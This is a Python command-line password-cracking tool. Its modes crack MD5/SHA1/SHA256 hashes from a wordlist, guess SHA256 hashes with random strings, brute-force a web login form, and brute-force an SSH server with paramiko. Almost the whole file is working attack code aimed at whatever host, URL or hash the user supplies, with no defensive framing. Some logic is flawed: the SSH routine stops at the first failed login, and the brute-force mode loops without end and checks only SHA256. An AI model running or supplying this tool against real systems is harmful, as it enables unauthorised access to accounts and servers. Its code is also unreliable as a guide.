#!/usr/bin/env python

"""
This script can be used to perform the following attacks:
- Dictionary Attack
- Brute-Force Attack
- Random Login Attack
- SSH Brute-Force Attack
"""

import argparse
import hashlib
import os
import random
import string
import sys
import time
from logging import getLogger, basicConfig, INFO, DEBUG
from threading import Thread

import colorama
import paramiko
import requests


# Setup logging
basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=INFO)
logger = getLogger(__name__)


def perform_dict_attack(password_hash: str) -> None:
    """
    Perform a dictionary attack using the given password hash.
    """
    try:
        dict_file = "Passwords.txt"
        if not os.path.isfile(dict_file):
            logger.error("Dictionary file not found!")
            return
        
        with open(dict_file, errors="ignore") as dictionary_file:
            content = dictionary_file.readlines()
            disc_list = [word.strip() for word in content]
        
        for word in disc_list:
            # Learn and match the hash entered with generated one
            if len(password_hash) == 32:
                disc_hash = hashlib.md5(word.encode("utf-8")).hexdigest()
            elif len(password_hash) == 40:
                disc_hash = hashlib.sha1(word.encode("utf-8")).hexdigest()
            elif len(password_hash) == 64:
                disc_hash = hashlib.sha256(word.encode("utf-8")).hexdigest()
            else:
                logger.error("Invalid hash provided!")
                return
            if disc_hash == password_hash:
                time.sleep(0.5)
                logger.info("Password found!")
                logger.info(word)
                return
        logger.error("Password not found!")
    except PermissionError:
        logger.error("Dictionary file permission denied!")
    except Exception as e:
        logger.error(f"Error occurred: {e}")


def perform_brute_force_attack(password_hash: str, numb_of_char: int, type_of_characters: int) -> None:
    """
    Perform a brute-force attack using the given password hash.
    """
    try:
        if type_of_characters == 1:
            choice_of_char = string.ascii_letters + string.digits + string.punctuation
        elif type_of_characters == 2:
            choice_of_char = string.ascii_letters
        elif type_of_characters == 3:
            choice_of_char = string.ascii_letters + string.digits
        elif type_of_characters == 4:
            choice_of_char = string.ascii_letters + string.punctuation
        elif type_of_characters == 5:
            choice_of_char = string.digits + string.punctuation
        elif type_of_characters == 6:
            choice_of_char = string.digits
        else:
            logger.error("Invalid character type provided!")
            return

        logger.info("Cracking password...")
        logger.info("")

        while True:
            gen_str = ''.join(random.choices(choice_of_char, k=numb_of_char))
            generated_hash = hashlib.sha256(gen_str.encode()).hexdigest()

            if generated_hash == password_hash:
                logger.info("Password found!")
                logger.info(gen_str)
                return
                
    except Exception as e:
        logger.error(f"Error occurred: {e}")

                
                
def perform_random_login_attack(username: str, password_list: list, url: str) -> None:
    """
    Perform a random login attack using the given list of passwords.
    """
    try:
        session = requests.Session()
        logger.info("Cracking password...")

        for password in password_list:
            time.sleep(0.5)
            response = session.post(url, data={"username": username, "password": password}, allow_redirects=False)

            if response.status_code == 302:
                logger.info("Password found!")
                logger.info(password)
                return

        logger.error("Password not found!")
    except Exception as e:
        logger.error(f"Error occurred: {e}")


def perform_ssh_brute_force_attack(hostname: str, username: str, password_list: list, port: int) -> None:
    """
    Perform an SSH brute-force attack using the given list of passwords.
    """
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        for password in password_list:
            time.sleep(0.5)
            client.connect(hostname=hostname, port=port, username=username, password=password)

            if client.get_transport().is_authenticated():
                logger.info("Password found!")
                logger.info(password)
                client.close()
                return

        logger.error("Password not found!")
    except paramiko.AuthenticationException:
        logger.error("Authentication failed!")
    except paramiko.SSHException:
        logger.error("Unable to establish SSH connection!")
    except Exception as e:
        logger.error(f"Error occurred: {e}")
        
        
def main():
    parser = argparse.ArgumentParser(description="Perform different types of attacks.")
    parser.add_argument("attack_type", help="type of attack to perform", choices=["dictionary", "brute_force", "random_login", "ssh_brute_force"])
    parser.add_argument("--password_hash", help="password hash to crack")
    parser.add_argument("--numb_of_char", help="number of characters to try in brute-force attack", type=int)
    parser.add_argument("--type_of_characters", help="type of characters to try in brute-force attack", type=int)
    parser.add_argument("--username", help="username for random login attack")
    parser.add_argument("--password_list", help="file containing list of passwords for random login attack")
    parser.add_argument("--url", help="url for login page for random login attack")
    parser.add_argument("--hostname", help="hostname for ssh brute-force attack")
    parser.add_argument("--ssh_username", help="username for ssh brute-force attack")
    parser.add_argument("--ssh_password_list", help="file containing list of passwords for ssh brute-force attack")
    parser.add_argument("--ssh_port", help="port for ssh brute-force attack", type=int)

    args = parser.parse_args()

    if args.attack_type == "dictionary":
        perform_dict_attack(args.password_hash)
    elif args.attack_type == "brute_force":
        perform_brute_force_attack(args.password_hash, args.numb_of_char, args.type_of_characters)
    elif args.attack_type == "random_login":
        with open(args.password_list) as f:
            password_list = f.read().splitlines()
        perform_random_login_attack(args.username, password_list, args.url)
    elif args.attack_type == "ssh_brute_force":
        with open(args.ssh_password_list) as f:
            password_list = f.read().splitlines()
        perform_ssh_brute_force_attack(args.hostname, args.ssh_username, password_list, args.ssh_port)

if __name__ == "__main__":
    main()
